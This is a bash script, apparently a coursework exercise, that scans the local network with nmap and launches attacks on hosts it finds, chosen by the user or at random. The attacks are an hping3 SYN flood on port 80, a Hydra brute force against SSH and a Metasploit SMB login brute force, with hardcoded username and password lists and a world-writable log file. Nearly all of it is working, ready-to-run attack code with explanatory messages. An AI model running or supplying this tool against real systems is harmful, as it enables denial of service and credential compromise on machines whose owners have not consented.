#!/bin/bash 

	echo 'This script will allow to you perform automated attacks. First, we need to figure out your network information.'
	
sudo touch /var/log/automation.log                  #File creation in /var/log
sudo chmod 777 /var/log/automation.log              #Ensure read/write/execute privileges are activated otherwise the user may not be may not be able to record data in this log file.	
timecheck=$(timedatectl | head -n1)                 #credit to https://www.cyberciti.biz/faq/linux-display-date-and-time/ for the timedatectl command. head -n1 is used to isolate the local time, it can be removed to reveal in-depth information. 	
	
usernames=$'Admin\nkali\nadministrator\ntc\njohn'   #A string of user names is created here, used for stored into a user.lst file. The file is used by Hydra and SMB_ENUM attacks to crack/reveal the target's login credentials. 
passwords=$'Admin\nkali\nadministrator\ntc\nPassw0rd!'   #A string of passwords. \n is used between user and password values to break them into a new line.

	echo 'A username and password list will be created to facilitate attacks that require them. (Hydra and SMB_Enum). They will be saved as user.lst and pass.lst in your current directory.'
	echo -e "$usernames" >> user.lst 				# -e option is used to allow '\n' to function. In other words, the individual user/password values are represented on a new line.
	echo -e "$passwords" >> pass.lst 				# Refer to man echo. 
													# This concept is borrowed from https://stackoverflow.com/questions/3005963/how-can-i-have-a-newline-in-a-string-in-sh
													# ALTERNATIVE: Crunch can be used to generate a password and username list as well.
													# Lists can also be fetched from databases in the internet. Lists of commonly used passwords and usernames can be found online. 

	
	
	
	
	
	
hping3_function1() {
	
	sudo timeout 10s hping3 -S --flood -V -p 80 $first #Flooding SYN packets via Port 80. This is a DOS (DENIAL OF SERVICE) since flooded packets can cause the target device to freeze or crash. Running uptime/task manager will reveal spike in CPU usage.
													   #timeout command is set to 10s for illustration purposes, it can be removed to allow scanning to go on indefinitely until the script is manually stopped (Ctrl + C)
	 
	
	echo "Attack Type: HPING3" >> /var/log/automation.log
	echo "Execution Time: $timecheck" >> /var/log/automation.log
	echo "Your IP Address is: $yourip" >> /var/log/automation.log
	echo "Target IP Address: $first" >> /var/log/automation.log
	
}	
	
hping3_function2() {
	
	sudo timeout 10s hping3 -S --flood -V -p 80 $second 
	
	
	echo "Attack Type: HPING3" >> /var/log/automation.log
	echo "Execution Time: $timecheck" >> /var/log/automation.log
	echo "Your IP Address is: $yourip" >> /var/log/automation.log
	echo "Target IP Address: $second" >> /var/log/automation.log

	

	
}	
	
hping3_function3() {
	
	sudo timeout 10s hping3 -S --flood -V -p 80 $third 
	
	
	
	echo "Attack Type: HPING3" >> /var/log/automation.log
	echo "Execution Time: $timecheck" >> /var/log/automation.log
	echo "Your IP Address is: $yourip" >> /var/log/automation.log
	echo "Target IP Address: $third" >> /var/log/automation.log

	
	
}	




hydra_function1() {

	hydra -L user.lst -P pass.lst $first ssh -vV #The user.lst and pass.lst can be written from scratch sudo the nano command in the terminal, downloaded from the internet or generated with tools such as CRUNCH. 
                                                 #The protocol used for this IP address ($first) is ssh since it is a Ubuntu. However, it can be changed to another protocol such as RDP, through port:3389, a common exploitable target for hackers. 
                                                 #-vV allows the command to run in verbose mode / show login+pass combination for each attempt. Refer to the manual by running the command: $man hydra (for other options) 
                                         
	
	
		echo "Attack Type: Hydra" >> /var/log/automation.log 
		echo "Your IP Address: $yourip" >> /var/log/automation.log   #Your local IP address is stored in this variable, refer to line 447. 
		echo "Target IP Address: $first" >> /var/log/automation.log  #double quotation marks to ensure that variable is not read as a string, but rather registered as a value stored inside the variable. in this case $first = The target IP address. 
		echo "Execution Time: $timecheck" >> /var/log/automation.log #Specify the full path to ensure that data is logged in the desired folder inside /var/log directory. If full path is not specified, the machine will search for hydra_1.txt in the current directory which does not exist.
        
}

hydra_function2() {

	hydra -L user.lst -P pass.lst $second ssh -vV 
                                         
	
	 	
		echo "Attack Type: Hydra" >> /var/log/automation.log 
		echo "Your IP Address: $yourip" >> /var/log/automation.log
		echo "Target IP Address: $second" >> /var/log/automation.log  
		echo "Execution Time: $timecheck" >> /var/log/automation.log 
      
}


hydra_function3() {

	hydra -L user.lst -P pass.lst $third ssh -vV 
                                         
		
		echo "Attack Type: Hydra" >> /var/log/automation.log
		echo "Your IP Address: $yourip" >> /var/log/automation.log
		echo "Target IP Address: $third" >> /var/log/automation.log  
		echo "Execution Time: $timecheck" >> /var/log/automation.log 

}



	
msf_function1() {														

	echo 'Please be patient while the attack is being executed'         #The command can take some time to run, so the user is notified.
	echo 'use auxiliary/scanner/smb/smb_login' >> smb_enum_script.rc	#A resource file is created here, within which all the parameters for the SMB_Enum attack are set.
	echo "set rhosts $first" >> smb_enum_script.rc						#A remote host is specified. Since this is msf_function1, the IP Address presented in Option 1 of the network_function is set as the target. 
	echo 'set user_file user.lst' >> smb_enum_script.rc					#A username list is specified from which the program can check it against the password list to expose possible weak credentials at the target IP address. 
	echo 'set pass_file pass.lst' >> smb_enum_script.rc					#A password list is set. Both the user.lst and pass.lst are created in advance between lines 9-13. 
	echo 'run' >> smb_enum_script.rc									#The program will run.
	echo 'exit' >> smb_enum_script.rc									#Once the program is completed, it will exit.

msfconsole -r smb_enum_script.rc -o smb_enum_process_log.txt			#The output file containing the PROCESS of this attack is specified as smb_enum_process_log.txt, it is saved in the current directory (where the script is executed)
																		#For example, if you are in /home running the script, this .txt file is saved in /home. 
	
	
	echo "Attack Type: SMB Enumeration" >> /var/log/automation.log 		# A log is created in line 5, within which the information from lines 128-131 are stored. 
	echo "Your IP Address: $yourip" >> /var/log/automation.log			
	echo "Target IP Address: $first" >> /var/log/automation.log  		
	echo "Execution Time: $timecheck" >> /var/log/automation.log 		#$timecheck is a variable within which the command: timedatectl | head -n1 is stored. Refer to line 7. 
}

msf_function2() {														

	echo 'Please be patient while the attack is being executed'
	echo 'use auxiliary/scanner/smb/smb_login' >> smb_enum_script.rc
	echo "set rhosts $second" >> smb_enum_script.rc
	echo 'set user_file user.lst' >> smb_enum_script.rc
	echo 'set pass_file pass.lst' >> smb_enum_script.rc
	echo 'run' >> smb_enum_script.rc
	echo 'exit' >> smb_enum_script.rc

msfconsole -r smb_enum_script.rc -o smb_enum_process_log.txt
	
	
	echo "Attack Type: SMB Enumeration" >> /var/log/automation.log 
	echo "Your IP Address: $yourip" >> /var/log/automation.log
	echo "Target IP Address: $second" >> /var/log/automation.log  
	echo "Execution Time: $timecheck" >> /var/log/automation.log 

}

msf_function3() {														

	echo 'Please be patient while the attack is being executed'
	echo 'use auxiliary/scanner/smb/smb_login' >> smb_enum_script.rc
	echo "set rhosts $third" >> smb_enum_script.rc
	echo 'set user_file user.lst' >> smb_enum_script.rc
	echo 'set pass_file pass.lst' >> smb_enum_script.rc
	echo 'run' >> smb_enum_script.rc
	echo 'exit' >> smb_enum_script.rc

msfconsole -r smb_enum_script.rc -o smb_enum_process_log.txt

	echo "Attack Type: SMB Enumeration" >> /var/log/automation.log 
	echo "Your IP Address: $yourip" >> /var/log/automation.log
	echo "Target IP Address: $third" >> /var/log/automation.log  
	echo "Execution Time: $timecheck" >> /var/log/automation.log 
}


random_attack=$((1 + RANDOM % 3)) 					#A random number from 1-3 is generated here. An if statement will thereafter produce the appropriate results corresponding to the 3 ATTACK options. eg: If 3 is generated, then the third ATTACK, msf smb_enum_login is used. 
													#https://www.youtube.com/watch?v=DS0VQAC-gak : Random Number Variable in BASH - Linux Commands *CREDIT TO AUTHOR: Linux Leech*



menu_function1() {



echo 'Select your choice of attack'
echo "1 : HPING3 "
echo "2 : HYDRA "
echo "3 : SMB (Server Message Block) Enumeration "
echo "4 : Random " 

read OPTIONS



case $OPTIONS in 

	1) 						#EXPLAIN syntax of alphabet case
		echo 'You have selected DOS.'
		echo 'Hping3: Hping3 is a type of DOS (Denial of Service) attack. It is used to flood the target IP address with numerous packets, causing the target system to either crash or freeze. As the name suggests, when the target system crashes, service to legitimate users is denied, so this is a capable attacking method. 
It can also be used to test firewalls, to possibly expose vulnerabiltiies that can later be patched with appropriate rules and configuration. 
For the purpose of this script, Hping3 is set to timeout after 10 seconds. However, even in a span of 10 seconds, the target system will notice a significant increase in processor stress. 
Refer to this article for more information: https://linuxhint.com/hping3/'
		hping3_function1
		
	;;
	
	2)						#EXPLAIN syntax of alphabet case
		echo 'You have selected Hydra'
		echo 'Hydra: Hydra is a brute-force attack method that is used to crack passwords. It is popular because of its versatility, allowing the attacker to penetrate the target via numerous protocols such as FTP, SSH, Telnet, and so on. 
SSH is commonly used to target Linux systems, whereas RDP is a commonly known vulnerable port in many Windows machines in business environments. 
Hydra is an online brute-force attacking tool, which makes it extremely popular among hackers who may seek to wreak havoc over the internet. 
For the purpose of this script, the SSH protocol is used (Port 22).
Refer to this article for more information: https://www.freecodecamp.org/news/how-to-use-hydra-pentesting-tutorial/#:~:text=Hydra%20is%20a%20brute%2Dforcing,databases%2C%20and%20several%20other%20services.'
		hydra_function1
		
	;;
	
	3)	
		echo 'You have selected SMB (Server Message Block) Enumeration as your attack method.' 
		echo 'SMB Enumeration: The SMB (Server Message Block) Network Protocol belongs to the Application Layer of the OSI model. It is used for sharing files. In this case, Metasploit is used to check a list of usernames against a list of passwords to confirm login credentials on a target IP Address
via port 445 which is the default SMB port, although this can be replaced with another custom port number. This method of attack is used to identify weak/default credentials that could be easily compromised. 
It is important to note that this method of attack is not a penetrating attack that causes any damage to the target system, but rather a method of information-gathering. 
Refer to this guide for more information: https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/'
		msf_function1
		
		
		
	;;
	
	4)
		
		if  [ $random_attack == 1 ]; then
		 
			echo "A random ATTACK has been selected for you: HPING3"
			echo 'Hping3: Hping3 is a type of DOS (Denial of Service) attack. It is used to flood the target IP address with numerous packets, causing the target system to either crash or freeze. As the name suggests, when the target system crashes, service to legitimate users is denied, so this is a capable attacking method. 
It can also be used to test firewalls, to possibly expose vulnerabiltiies that can later be patched with appropriate rules and configuration. 
For the purpose of this script, Hping3 is set to timeout after 10 seconds. However, even in a span of 10 seconds, the target system will notice a significant increase in processor stress. 
Refer to this article for more information: https://linuxhint.com/hping3/'
			hping3_function1
			
		elif [ $random_attack == 2 ]; then
			echo "A random ATTACK has been selected for you: HYDRA"
			echo 'Hydra: Hydra is a brute-force attack method that is used to crack passwords. It is popular because of its versatility, allowing the attacker to penetrate the target via numerous protocols such as FTP, SSH, Telnet, and so on. 
SSH is commonly used to target Linux systems, whereas RDP is a commonly known vulnerable port in many Windows machines in business environments. 
Hydra is an online brute-force attacking tool, which makes it extremely popular among hackers who may seek to wreak havoc over the internet. 
For the purpose of this script, the SSH protocol is used (Port 22).
Refer to this article for more information: https://www.freecodecamp.org/news/how-to-use-hydra-pentesting-tutorial/#:~:text=Hydra%20is%20a%20brute%2Dforcing,databases%2C%20and%20several%20other%20services.'
			hydra_function1
			
		else 
			echo "A random ATTACK has been selected for you: SMB (Server Message Block) Enumeration"	
			echo 'SMB Enumeration: The SMB (Server Message Block) Network Protocol belongs to the Application Layer of the OSI model. It is used for sharing files. In this case, Metasploit is used to check a list of usernames against a list of passwords to confirm login credentials on a target IP Address
via port 445 which is the default SMB port, although this can be replaced with another custom port number. This method of attack is used to identify weak/default credentials that could be easily compromised. 
It is important to note that this method of attack is not a penetrating attack that causes any damage to the target system, but rather a method of information-gathering. 
Refer to this guide for more information: https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/'
			msf_function1
			
		fi	
	
		
	;;
	esac 	
	
		 
}

menu_function2() {



echo 'Select your choice of attack'
echo "1 : HPING3 "
echo "2 : HYDRA "
echo "3 : SMB (Server Message Block) Enumeration "
echo "4 : Random " 

read OPTIONS



case $OPTIONS in 

	1) 						#EXPLAIN syntax of alphabet case
		echo 'You have selected DOS.'
		echo 'Hping3: Hping3 is a type of DOS (Denial of Service) attack. It is used to flood the target IP address with numerous packets, causing the target system to either crash or freeze. As the name suggests, when the target system crashes, service to legitimate users is denied, so this is a capable attacking method. 
It can also be used to test firewalls, to possibly expose vulnerabiltiies that can later be patched with appropriate rules and configuration. 
For the purpose of this script, Hping3 is set to timeout after 10 seconds. However, even in a span of 10 seconds, the target system will notice a significant increase in processor stress. 
Refer to this article for more information: https://linuxhint.com/hping3/'
		hping3_function2
		
	;;
	
	2)						#EXPLAIN syntax of alphabet case
		echo 'You have selected Hydra'
		echo 'Hydra: Hydra is a brute-force attack method that is used to crack passwords. It is popular because of its versatility, allowing the attacker to penetrate the target via numerous protocols such as FTP, SSH, Telnet, and so on. 
SSH is commonly used to target Linux systems, whereas RDP is a commonly known vulnerable port in many Windows machines in business environments. 
Hydra is an online brute-force attacking tool, which makes it extremely popular among hackers who may seek to wreak havoc over the internet. 
For the purpose of this script, the SSH protocol is used (Port 22).
Refer to this article for more information: https://www.freecodecamp.org/news/how-to-use-hydra-pentesting-tutorial/#:~:text=Hydra%20is%20a%20brute%2Dforcing,databases%2C%20and%20several%20other%20services.'
		hydra_function2
		
	;;
	
	
	3)	
		echo 'You have selected SMB (Server Message Block) Enumeration as your attack method.' 
		echo 'SMB Enumeration: The SMB (Server Message Block) Network Protocol belongs to the Application Layer of the OSI model. It is used for sharing files. In this case, Metasploit is used to check a list of usernames against a list of passwords to confirm login credentials on a target IP Address
via port 445 which is the default SMB port, although this can be replaced with another custom port number. This method of attack is used to identify weak/default credentials that could be easily compromised. 
It is important to note that this method of attack is not a penetrating attack that causes any damage to the target system, but rather a method of information-gathering. 
Refer to this guide for more information: https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/'
		msf_function2
		
		
	
	;;
	
	4)	
		
		if  [ $random_attack == 1 ]; then
		 
			echo "A random ATTACK has been selected for you: HPING3"
			echo 'Hping3: Hping3 is a type of DOS (Denial of Service) attack. It is used to flood the target IP address with numerous packets, causing the target system to either crash or freeze. As the name suggests, when the target system crashes, service to legitimate users is denied, so this is a capable attacking method. 
It can also be used to test firewalls, to possibly expose vulnerabiltiies that can later be patched with appropriate rules and configuration. 
For the purpose of this script, Hping3 is set to timeout after 10 seconds. However, even in a span of 10 seconds, the target system will notice a significant increase in processor stress. 
Refer to this article for more information: https://linuxhint.com/hping3/'
			hping3_function2
			
		elif [ $random_attack == 2 ]; then
			echo "A random ATTACK has been selected for you: HYDRA"
			echo 'Hydra: Hydra is a brute-force attack method that is used to crack passwords. It is popular because of its versatility, allowing the attacker to penetrate the target via numerous protocols such as FTP, SSH, Telnet, and so on. 
SSH is commonly used to target Linux systems, whereas RDP is a commonly known vulnerable port in many Windows machines in business environments. 
Hydra is an online brute-force attacking tool, which makes it extremely popular among hackers who may seek to wreak havoc over the internet. 
For the purpose of this script, the SSH protocol is used (Port 22).
Refer to this article for more information: https://www.freecodecamp.org/news/how-to-use-hydra-pentesting-tutorial/#:~:text=Hydra%20is%20a%20brute%2Dforcing,databases%2C%20and%20several%20other%20services.'
			hydra_function2
			
		else 
			echo "A random ATTACK has been selected for you: SMB_ENUM_LOGIN"	
			echo 'SMB Enumeration: The SMB (Server Message Block) Network Protocol belongs to the Application Layer of the OSI model. It is used for sharing files. In this case, Metasploit is used to check a list of usernames against a list of passwords to confirm login credentials on a target IP Address
via port 445 which is the default SMB port, although this can be replaced with another custom port number. This method of attack is used to identify weak/default credentials that could be easily compromised. 
It is important to note that this method of attack is not a penetrating attack that causes any damage to the target system, but rather a method of information-gathering. 
Refer to this guide for more information: https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/'
			msf_function2
			
		fi	
	
		
	;;
	esac 	
	
		 
}

menu_function3() {



echo 'Select your choice of attack'
echo "1 : HPING3 "
echo "2 : HYDRA "
echo "3 : SMB (Server Message Block) Enumeration "
echo "4 : Random " 

read OPTIONS



case $OPTIONS in 

	1) 						#EXPLAIN syntax of alphabet case
		echo 'You have selected HPING3.'
		echo 'Hping3: Hping3 is a type of DOS (Denial of Service) attack. It is used to flood the target IP address with numerous packets, causing the target system to either crash or freeze. As the name suggests, when the target system crashes, service to legitimate users is denied, so this is a capable attacking method. 
It can also be used to test firewalls, to possibly expose vulnerabiltiies that can later be patched with appropriate rules and configuration. 
For the purpose of this script, Hping3 is set to timeout after 10 seconds. However, even in a span of 10 seconds, the target system will notice a significant increase in processor stress. 
Refer to this article for more information: https://linuxhint.com/hping3/'
		hping3_function3
		
	;;
	
	2)						#EXPLAIN syntax of alphabet case
		echo 'You have selected Hydra'
		echo 'Hydra: Hydra is a brute-force attack method that is used to crack passwords. It is popular because of its versatility, allowing the attacker to penetrate the target via numerous protocols such as FTP, SSH, Telnet, and so on. 
SSH is commonly used to target Linux systems, whereas RDP is a commonly known vulnerable port in many Windows machines in business environments. 
Hydra is an online brute-force attacking tool, which makes it extremely popular among hackers who may seek to wreak havoc over the internet. 
For the purpose of this script, the SSH protocol is used (Port 22).
Refer to this article for more information: https://www.freecodecamp.org/news/how-to-use-hydra-pentesting-tutorial/#:~:text=Hydra%20is%20a%20brute%2Dforcing,databases%2C%20and%20several%20other%20services.'
		hydra_function3
		
	;;
	
	3)	
		echo 'You have selected SMB_Enumerator as your attack method.' 
		echo 'SMB Enumeration: The SMB (Server Message Block) Network Protocol belongs to the Application Layer of the OSI model. It is used for sharing files. In this case, Metasploit is used to check a list of usernames against a list of passwords to confirm login credentials on a target IP Address
via port 445 which is the default SMB port, although this can be replaced with another custom port number. This method of attack is used to identify weak/default credentials that could be easily compromised. 
It is important to note that this method of attack is not a penetrating attack that causes any damage to the target system, but rather a method of information-gathering. 
Refer to this guide for more information: https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/'
		msf_function3
		
		
		
	;;
	
	4)	
		
		if  [ $random_attack == 1 ]; then
		 
			echo "A random ATTACK has been selected for you: HPING3"
			echo 'Hping3: Hping3 is a type of DOS (Denial of Service) attack. It is used to flood the target IP address with numerous packets, causing the target system to either crash or freeze. As the name suggests, when the target system crashes, service to legitimate users is denied, so this is a capable attacking method. 
It can also be used to test firewalls, to possibly expose vulnerabiltiies that can later be patched with appropriate rules and configuration. 
For the purpose of this script, Hping3 is set to timeout after 10 seconds. However, even in a span of 10 seconds, the target system will notice a significant increase in processor stress. 
Refer to this article for more information: https://linuxhint.com/hping3/'
			hping3_function3
			
		elif [ $random_attack == 2 ]; then
			echo "A random ATTACK has been selected for you: HYDRA"
			echo 'Hydra: Hydra is a brute-force attack method that is used to crack passwords. It is popular because of its versatility, allowing the attacker to penetrate the target via numerous protocols such as FTP, SSH, Telnet, and so on. 
SSH is commonly used to target Linux systems, whereas RDP is a commonly known vulnerable port in many Windows machines in business environments. 
Hydra is an online brute-force attacking tool, which makes it extremely popular among hackers who may seek to wreak havoc over the internet. 
For the purpose of this script, the SSH protocol is used (Port 22).
Refer to this article for more information: https://www.freecodecamp.org/news/how-to-use-hydra-pentesting-tutorial/#:~:text=Hydra%20is%20a%20brute%2Dforcing,databases%2C%20and%20several%20other%20services.'
			hydra_function3
			
		else 
			echo "A random ATTACK has been selected for you: SMB_ENUM_LOGIN"	
			echo 'SMB Enumeration: The SMB (Server Message Block) Network Protocol belongs to the Application Layer of the OSI model. It is used for sharing files. In this case, Metasploit is used to check a list of usernames against a list of passwords to confirm login credentials on a target IP Address
via port 445 which is the default SMB port, although this can be replaced with another custom port number. This method of attack is used to identify weak/default credentials that could be easily compromised. 
It is important to note that this method of attack is not a penetrating attack that causes any damage to the target system, but rather a method of information-gathering. 
Refer to this guide for more information: https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/'
			msf_function3
			
			
		fi	
	
		
	;;
	esac 	
	
		 
}


	
	
	
random_ip=$(( 1 + RANDOM % 3))                       #A random number from 1-3 is generated here. An if statement will thereafter produce the appropriate results corresponding to the 3 IP options.If 1 is generated, then the first IP, $first is used. 	
													 #https://www.youtube.com/watch?v=DS0VQAC-gak : Random Number Variable in BASH - Linux Commands *CREDIT TO AUTHOR: Linux Leech*
	
network_function() {
	
yourip=$(ifconfig | grep inet |  awk '{print $2}' | head -n1)

	echo "Your IP address is $yourip."

lanip=$(ip a | grep -w inet | tail -n1 | awk '{print $2}')					  										#Grep for Network address, to be scanned by nmap to reveal all targetable IPs. 
	
	echo "Your Network address is $lanip. Performing a scan with nmap... "			                                        
	echo 'Scanning... '
	
	
first=$(sudo nmap $lanip -F --top-ports 100 | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" | head -n1)	                
second=$(sudo nmap $lanip -F --top-ports 100 | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" | head -n2 | tail -n1)    #For the purpose of this script, -F is used to perform a fast scan of the top 100 most common ports. 
third=$(sudo nmap $lanip -F --top-ports 100| grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" | head -n3 | tail -n1)      #A grep expression is used after the scan to isolate and retrieve the IP addresses.
																												    #Three IP addresses are retrieved in this case, and stored into variables that are used for executing attacks.


echo 'Select your target.'
echo "1 : "$first" "       # The first IP Address is stored in this variable. This IP address is hard coded as a target into Menu_function1, which leads into hping3_function1, hydra_function1, msf_function1. 
echo "2 : "$second" "      # The second IP Address is stored here. This IP address is hard coded as a target into Menu_function2, which leads into hping3_function2, hydra_function2, msf_function2.
echo "3 : "$third" "       # The third IP Address is stored here. This IP address is hard coded as a target into Menu_function3, which leads into hping3_function3, hydra_function3, msf_function3. 
echo "4 : Random "         # Refer to line 440 where a random number is generated from 1-3. The if statement will then run the menu_function corresponding to the result number. Eg: Result 1 = Option 1. So it triggers menu_function1. 
read OPTIONS               # User input is read here. Only 4 inputs are registered from 1-4 that will lead into a menu_function, which then leads into the selected attack function. 

case $OPTIONS in 

	1) 						
		echo "$first will be targetted."
		menu_function1
				
	;;
	
	2)						
		echo "$second will be targetted."
		menu_function2
		
	;;
	
	3)	
		echo "You have selected $third as your target IP address."
		menu_function3
		
		
		
		
	;;
	
		
	4)	
		echo "A random IP will be selected from the list"
		
		if  [ $random_ip == 1 ]; then					#If statement is used here to automate a random option. If the random number generated is 1, menu_function1 is activated. 
		 
			echo "Your random target IP address is: $first."
			menu_function1
														 
		elif [ $random_ip == 2 ]; then					#If statement is used here to automate a random option. If the random number generated is 1, menu_function1 is activated.
			echo "Your random target IP address is: $second."
			menu_function2
			
		else 
			echo "Your random target IP address is: $third."	
			menu_function3								#If 1 and 2 are not generated, that leaves only one option: 3, since the code in line 440 is only designed to generated numbers 1-3. So menu_function 3 is triggered. 
			
		fi	
	
	
	;;
	
	
	
	
	esac 		
	
}

network_function


echo 'Your results have been saved into a log file in the following directory: /var/log/automation.log' #This is the last message to notify the user that a log has been created. Refer to lines 5-7. 









































# TODO
# 1) Create 3 functions for 3 attacks
# 2) Create  nmap scanning to present IP addresses on the network.
# 3) give user option to choose a target IP   .. OR .. give them a random IP to attack. 
# 4)  On attack selection, save it into a log file in /var/log – (5 Points)
# 5) The log should hold the kind of attack, time of execution, and IP addresses
